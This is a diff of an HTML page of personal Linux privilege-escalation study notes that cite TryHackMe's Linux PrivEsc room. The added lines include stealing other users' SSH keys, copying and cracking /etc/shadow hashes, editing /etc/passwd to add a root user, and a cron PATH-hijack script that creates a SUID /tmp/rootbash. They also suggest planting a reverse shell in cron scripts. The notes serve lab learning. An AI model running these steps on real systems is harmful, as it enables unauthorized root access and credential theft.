@@ -5,31 +5,65 @@
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">Cat /etc/lsb-release</span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">get OS name and version and search for vulns</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 24px;"><u><strong><span style="color: rgb(85, 57, 130);">History, SSH and config files (part of cred hunting)</span></strong></u></span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">cat /home/user/.history</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">can you access another users directory and look at the .ssh directory ? - take the id_ras key and save on your system (give it chmod 600 permissions)</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">can you see a ovpn file? might be credentials there</span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 24px;"><strong><u><span style="color: rgb(250, 197, 28);">Vulnerable Services</span></u></strong></span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">For example: Screen V4.5 is vulnerable. So check software</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">Also look for service where its running as ROOT and the root user for service does not have a password assigned.</span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">&nbsp;</span></p>
-<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 24px;"><strong><u><span style="color: rgb(85, 57, 130);">Cron Job</span></u> </strong></span></p>
-<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null &ndash; Searching for writeable files</span></p>
-<div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
-    <ul style="margin-bottom:0cm;list-style-type: undefined;">
-        <li style="margin: 0cm 0cm 8pt; line-height: 107%; font-size: 20px; font-family: Calibri, sans-serif;">Use tool pspy to view running processes -usage: ./pspy64 -pf -i 1000</li>
-    </ul>
-</div>
-<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">Might be able to add revere shell command to the .sh file</span></p>
-<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">&nbsp;</span></p>
-<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 24px;"><strong><u><span style="color: rgb(243, 121, 52);">Special Permissions</span></u></strong></span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 24px;"><strong><u><span style="color: rgb(243, 121, 52);">Special Permissions - SUID/SGID</span></u></strong></span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">Setuid bit appears as &ldquo;s&rdquo; = executable bit set, &ldquo;S&rdquo; = exec not set</span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">find / -user root -perm -4000 -exec ls -ldb {} \; <strong>2</strong>&gt;/dev/null</span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">find / -uid 0 -perm -6000 -type f 2&gt;/dev/null &ndash; for groups</span></p>
-<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">&nbsp;</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;"><strong>Weak permissions 1:</strong></span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">- Can you read /etc/shadow &nbsp;? - if so make a copy of root users hash - and then use John to crack it&nbsp;</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;"><span style="font-size: 20px;"><strong>Weak permissions 2:</strong></span></span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">- is /etc/passwd writeable?</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">generate new password hash using: openssl passwd &lt;enter password&gt;</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">edit the /etc/passwd enter the password between 1st and 2nd colon(:) ie replace the X</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">OR - you could just create a NEW ROOT user all together, using the format of root user in the /etc/passwd</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 24px;"><strong><u><span style="color: rgb(41, 105, 176);">Sudo right abuse</span></u></strong></span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">sudo -l</span></p>
 <div style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>
     <ul style="margin-bottom:0cm;list-style-type: undefined;">
         <li style="margin: 0cm 0cm 8pt; line-height: 107%; font-size: 20px; font-family: Calibri, sans-serif;">Use man &lt;tool&gt; see if a way to exploit it</li>
+        <li style="margin: 0cm 0cm 8pt; line-height: 107%; font-size: 20px; font-family: Calibri, sans-serif;">Use GTFObins</li>
     </ul>
+    <p><br></p>
+    <p><strong><u><span style="font-size: 24px; color: rgb(250, 197, 28);">Cron Job</span></u><span style="font-size: 24px; color: rgb(250, 197, 28);">&nbsp;</span></strong></p>
+    <p><span style="font-size: 20px;">find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null &ndash; Searching for writeable files</span></p>
+    <div>
+        <ul>
+            <li style="font-size: 20px;">Use tool pspy to view running processes -usage: ./pspy64 -pf -i 1000</li>
+        </ul>
+    </div>
+    <p><span style="font-size: 20px;">Might be able to add revere shell command to the .sh file</span></p>
+    <p><br></p>
+    <p><u><strong><span style="font-size: 24px; color: rgb(250, 197, 28);">Crontab</span></strong></u></p>
+    <p><span style="font-size: 20px;">cat /etc/crontab - view contents of crontab</span></p>
+    <p><span style="font-size: 20px;">locate script.sh - sometimes maybe deleted so you create own, or it may not show full path</span></p>
+    <p><span style="font-size: 20px;">- overwrite with a reverse shell command</span></p>
+    <p><br></p>
+    <p><span style="font-size: 20px;"><strong>CronJobs &nbsp;- PATH env variable:</strong></span></p>
+    <p><span style="font-size: 20px;"><strong>-&nbsp;</strong>you notice that PATH variable starts with /home/user - so create a script.sh with contents:</span></p>
+    <p><br></p>
+    <p><span style="font-size: 20px;">#!/bin/bash<br><br>cp /bin/bash /tmp/rootbash<br>chmod +xs /tmp/rootbash</span></p>
+    <p><br></p>
+    <p><span style="font-size: 20px;">- make sure you chmod+x the file, wait for cronjob to run&nbsp;</span></p>
+    <p><span style="font-size: 20px;">- then /tmp/rootbash -p</span></p>
 </div>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">&nbsp;</span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 24px;"><strong><u><span style="color: rgb(184, 49, 47);">Path Abuse</span></u></strong></span></p>
@@ -125,3 +159,7 @@
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">On attacking: cp shell /mnt</span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">On attacking: &nbsp;chmod u+s /mnt/shell</span></p>
 <p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;">On victim: ./shell</span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 24px;"><strong><span style="color: rgb(209, 72, 65);"><u>Abusing Shell Features - SUID/SGID executables</u></span></strong></span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><span style="font-size: 20px;"><strong><span style="color: rgb(0, 0, 0);">Part 1 and Part 2 - look at Task 14 and 15 on Try Hack Me - Linux Priv Esc</span></strong></span></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><br></p>
